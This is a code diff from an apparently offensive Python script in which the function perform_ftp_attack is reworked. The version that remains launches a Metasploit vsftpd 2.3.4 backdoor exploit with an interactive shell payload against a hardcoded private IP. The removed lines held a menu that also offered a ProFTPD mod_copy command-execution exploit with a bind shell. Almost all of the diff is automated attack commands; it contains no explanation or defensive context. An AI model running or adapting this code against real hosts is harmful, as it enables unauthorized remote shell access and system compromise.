@@ -80,26 +80,11 @@ def perform_dos(ip_addr=None):
 # (6) Code to perform ftp attack
 def perform_ftp_attack():
     ip_addr = "192.168.200.55"
-    local_ip = "192.168.200.45"
 
-    print("(1) Exploit the vsftpd 2.3.4 backdoor vulnerability")
-    print("(2) Exploit the ProFTPD 1.3.1 mod_copy command execution vulnerability")
+    print("Exploiting the vsftpd 2.3.4 backdoor vulnerability... ")
 
-    # Get input from the user
-    choice = input("Enter the number of the attack to perform: ")
+    metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
 
-    if choice == "1":
-        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/vsftpd_234_backdoor; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/interact; run'"
-        return exploit_ftp(metasploit_command)
-    elif choice == "2":
-        metasploit_command = f"msfconsole -q -x 'use exploit/unix/ftp/proftpd_modcopy_exec; set RHOSTS {ip_addr}; set PAYLOAD cmd/unix/bind_perl; set LPORT 4444; set RHOST {local_ip}; run'"
-        return exploit_ftp(metasploit_command)
-    else:
-        print("Invalid choice\n")
-        return perform_ftp_attack()
-
-
-def exploit_ftp(metasploit_command):
     try:
         # Execute the Metasploit command using subprocess
         subprocess.run(metasploit_command, shell=True, check=True)
